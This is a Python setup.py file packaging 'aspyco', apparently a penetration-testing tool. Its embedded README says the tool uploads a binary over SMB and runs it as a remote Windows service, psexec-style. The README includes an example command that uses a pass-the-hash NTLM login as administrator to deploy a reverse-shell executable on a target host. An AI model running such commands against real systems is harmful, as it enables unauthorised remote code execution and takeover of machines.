# -*- coding: utf-8 -*-
from setuptools import setup

packages = \
['src']

package_data = \
{'': ['*']}

install_requires = \
['impacket>=0.10.0,<0.11.0']

entry_points = \
{'console_scripts': ['aspyco = src.aspyco:main']}

setup_kwargs = {
    'name': 'aspyco',
    'version': '1.1',
    'description': 'Upload and start your custom payloads remotely !',
    'long_description': '# Aspyco\n\n<div align="center">\n  <br>\n  <img src="https://img.shields.io/badge/Python-3.6+-informational">\n  <br>\n  <a href="https://twitter.com/intent/follow?screen_name=ProcessusT" title="Follow"><img src="https://img.shields.io/twitter/follow/ProcessusT?label=ProcessusT&style=social"></a>\n  <br>\n  <h1>\n    Inject your own venom 💉\n  </h1>\n  <br><br>\n</div>\n\n> Aspyco is a python script that permits to upload a local binary through SMB on a remote host.<br />\n> Then it remotely connects to svcctl named pipe through DCERPC to create and start the binary as a service.<br />\n> <br />\n> It\'s a psexec-like with custom execution !!\n> <br />\n<br>\n<div align="center">\n\t<!--\n<img src="future img" width="80%;">\n\t-->\n</div>\n<br>\n\n\n## Changelog\n<br />\nV 1.0<br />\n- Can inject custom payload on remote host\n\n<br /><br />\n\n## What da fuck is this ?\n<br />\nOn Windows, RPC protocol permits to call remote functions.<br />\nRemotely, you can connect on SMB named pipe to call functions with DCERPC protocol.<br />\nIn that way, you can upload a binary file through SMB and then call some functions<br />\nto create a service to execute your payload.\n<br />\n<br />\n\n## Installation\n<br>\nFrom Pypi :\n<br><br>\n\n```python\npip3 install aspyco\n```\n\n<br>\nFrom sources :\n<br><br>\n\n```python\ngit clone https://github.com/Processus-Thief/Aspyco\ncd Aspyco\npython3 setup.py install\n```\n\n<br><br>\n\n\n## Usage\n<br>\nAspyco uses Impacket syntax :\n<br><br>\n\n```python\nusage: aspyco.py [-h] [-hashes LMHASH:NTHASH] target payload\n\nUpload and start your custom payloads remotely !\n\npositional arguments:\n  target                [[domain/]username[:password]@]<targetName or address>\n  payload               Your custom binary file\n\noptions:\n  -h, --help            show this help message and exit\n  -hashes LMHASH:NTHASH\tNTLM hashes, format is LMHASH:NTHASH\n```\n\n<br>\n<br>\n\n## Example\n\n<br>\n\n```python\naspyco -hashes :ed0052e5a66b1c8e942cc9481a50d56 DOMAIN.local/administrator@10.0.0.1 custom_reverse_shell.exe\n```\n\n<br>\n<br>\n',
    'author': 'Processus Thief',
    'author_email': 'aspyco@thiefin.fr',
    'maintainer': 'Processus Thief',
    'maintainer_email': 'aspyco@thiefin.fr',
    'url': 'https://github.com/Processus-Thief/Aspyco',
    'packages': packages,
    'package_data': package_data,
    'install_requires': install_requires,
    'entry_points': entry_points,
    'python_requires': '>=3.6,<4.0',
}


setup(**setup_kwargs)
